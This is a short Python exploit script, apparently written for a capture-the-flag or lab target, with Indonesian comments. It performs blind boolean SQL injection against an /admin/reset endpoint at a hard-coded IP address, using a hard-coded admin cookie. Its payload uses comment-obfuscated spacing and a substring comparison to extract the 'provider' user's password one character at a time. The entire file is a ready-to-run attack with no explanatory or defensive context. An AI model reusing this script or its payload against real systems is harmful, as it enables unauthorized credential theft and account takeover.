import requests, time, sys

COOKIE = {"admin_token": "c18ab6435dd4141b246779795e7e9bd9"}
URL = "http://15.232.64.175:13410/admin/reset"
HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0"}
# patokan ril or fek
# {"status":"ok"}        -> TRUE response dari web
# {"status":"notfound"}  -> FALSE ni kalo usernamenya gaada
TRUE_MARKER = '"status":"ok"'
FALSE_MARKER = '"status":"notfound"'


def check_char(position, char_code):
    payload = f"nonexist'/**/OR/**/(unicode/**/(substr/**/(password,{position},1))={char_code}/**/AND/**/\"role\"='provider')/**/AND/**/'1'='1"
    r = requests.post(URL, headers=HEADERS, cookies=COOKIE, data={"username": payload})
    return TRUE_MARKER in r.text


def main():
    print("[*] Dumping password provider...")
    found = ""
    not_found_count = 0
    max_not_found = 3  # 3x ga nemu berarti kelar
    for pos in range(1, 100):
        found_char = None
        for code in range(32, 127):
            if check_char(pos, code):
                found_char = chr(code)
                found += found_char
                print(f"[+] FOUND '{found_char}' {pos:2d} | [{found}]")
                not_found_count = 0
                break

        if found_char is None:
            not_found_count += 1
            print(f"[-] Pos {pos}: not_found_count={not_found_count}")

        if not_found_count >= max_not_found:
            print(f"[-] {max_not_found}x not found. Stoping.")
            break

    print(f"\n[+] PASSWORD PROVIDER: {found}")


if __name__ == "__main__":
    main()
